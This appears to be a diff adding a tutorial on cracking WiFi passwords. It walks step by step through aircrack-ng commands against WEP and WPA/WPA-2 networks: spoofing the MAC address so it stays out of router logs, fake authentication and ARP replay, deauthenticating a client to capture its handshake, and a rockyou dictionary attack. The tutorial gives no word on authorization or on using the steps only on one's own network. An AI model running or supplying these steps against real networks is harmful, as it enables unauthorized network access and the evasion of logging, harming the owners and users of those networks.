@@ -1,0 +1,91 @@
+Wifi Cracking Session
+
+Wifi Hacking
+-------------
+
+This session is about cracking the wifi password. Firstly, WiFi is a abbreviation of Wireless Fidelity which was introduced to connect any computer over the internet without any LAN cable or any physical device (except wifi card, inbuild in computers). If you want to access Internet, the only thing which travels from your computer to the network is packets which contains data, earlier that data was transferred through LAN cables and then we come up with a technique to use air as a medium for transmitting the packets, so in WiFi, all the packets are transferred through the air and no physical cables are required to communicate over the internet.
+
+As the usage of WiFi among the users increases, it was very neccessary to put some kind of encryption, so that unknown users should not use it. So they come up with something as : WEP Encryption, WPA & WPA-2 Encryption Techniques.
+
+
+For any kind of cracking, there are some prerequisites needed as:
+1) VM Ware Workstation
+2) Kali Linux installed in Workstation
+3) WiFi Adaptor
+
+
+For cracking WEP type Encryption:
+---------------------------------
+
+Start Your Kali Linux and open terminal into it.
+
+1) airmon-ng -> This command will give you all the interfaces through which you can capture the wifi packets.
+
+2) airmon-ng stop <interface name> -> This command will stop the monitoring mode of the particular interface through which you want to crack the wifi password.
+
+3) macchanger --mac 00:11:22:33:44:55 <interface name> -> This will simply change your interface's mac address, so that whenever you try to connect with the router through this particular interface, your actual mac address should never be there in the logs of the router.
+
+4)airmon-ng start <interface name> -> This will restart the monitoring mode of the particular interface through which you want crack wifi. When you will execute this command there will be a line as (monitoring mode enable on <new interface name>)
+
+{
+* Incase you get some process(es) which could hamper your work, then you need to kill them at first. so for that use: 
+kill <pid> -> this will kill the particular process id which you want to kill. You need to type this command as much as the processes are there.
+}
+
+**Open new Terminal, but don't close the previous one**
+5) airodump-ng <new interface name> -> This command will simply list all the wifi routers whose packets can be captured through the wifi adaptor whose interface you have given.
+
+6) airodump-ng -c <channel> --bssid <bssid> -w <filename> <new interface name> -> This will start capturing all the packets of the particular wifi router whose bssid (mac address of the router) you will give and define the channel for that, you can giv any filename, it will be automatically generated and will store all the captured packets.
+
+**Open new Terminal, but don't close the previous one**
+7) aireplay-ng -1 0 -a <bssid> -h 00:11:22:33:44:55 <new interface name> -> This command will be doing the fake authentication with particular Access Point whose mac address will be given by you, through your defined mac address.
+
+8) aireplay-ng -3 -b <bssid> -h 00:11:22:33:44:55 <new interface name> -> Simply all the standard ARP requests will be start processing, but make sure that if the data packets will be transferring from the router to the authenticated user only then this request will work upon.
+
+**Open new Terminal, but don't close the previous one**
+9) aircrack-ng -b <bssid> <filename>-01.cap -> With this command you are simply passing your captured file where all the packets are stored to aircrack-ng and it is applying the reverse XOR with all the IVs and will obtain the password and display it to you.
+
+
+As WEP is very unsecure way to have your router encryption, so in order to improve security, we come up with WPA & WPA-2 Encryption type
+
+
+
+For cracking WPA & WPA-2 type Encryption:
+---------------------------------
+
+Start Your Kali Linux and open terminal into it.
+
+1) airmon-ng -> This command will give you all the interfaces through which you can capture the wifi packets.
+
+2) airmon-ng stop <interface name> -> This command will stop the monitoring mode of the particular interface through which you want to crack the wifi password.
+
+3) macchanger --mac 00:11:22:33:44:55 <interface name> -> This will simply change your interface's mac address, so that whenever you try to connect with the router through this particular interface, your actual mac address should never be there in the logs of the router.
+
+4)airmon-ng start <interface name> -> This will restart the monitoring mode of the particular interface through which you want crack wifi. When you will execute this command there will be a line as (monitoring mode enable on <new interface name>)
+
+{
+* Incase you get some process(es) which could hamper your work, then you need to kill them at first. so for that use: 
+kill <pid> -> this will kill the particular process id which you want to kill. You need to type this command as much as the processes are there.
+}
+
+**Open new Terminal, but don't close the previous one**
+5) airodump-ng <new interface name> -> This command will simply list all the wifi routers whose packets can be captured through the wifi adaptor whose interface you have given.
+
+**Open new Terminal, but don't close the previous one**
+6) airodump-ng -c <channel> --bssid <bssid> -w <filename> <new interface name> -> This will start capturing all the packets of the particular wifi router whose bssid (mac address of the router) you will give and define the channel for that, you can any give filename, it will be automatically generated and will store all the captured packets.
+
+**Open new Terminal, but don't close the previous one**
+7) aireplay-ng –0 2 –a <router bssid> –c <client bssid> <new interface name> -> This command will be making a deauth of the particular client whose mac you mentioned with the router you want to crack. As this deauthentication will be marked, router will try to connect with the authenticated user again, this will be captured in the file generated in the above step.
+
+8) aircrack-ng -w <path to wordlist> <filename>-01.cap -> This command will run a crack for WPA type encryption, but for this you have to define the dictionary through which you want to crack the router. If the captured file is having a proper handshake into it, and your dictionary has a password into it then you will get the password very easily.
+
+{
+	* Here the wordlist or the dictionary you need for the attack can either be downloaded from the internet or you can develop it by CRUNCH tool available in Kali Linux or you have a inbuilt file as RockYou, which you can simply give it.
+
+	for getting rockyou file you need to have the following thing : 
+	**open another terminal**
+	cd /usr/share/wordlists
+	gzip -d rockyou.txt.gz
+
+	and give the path as : /usr/share/wordlists/rockyou.txt
+}
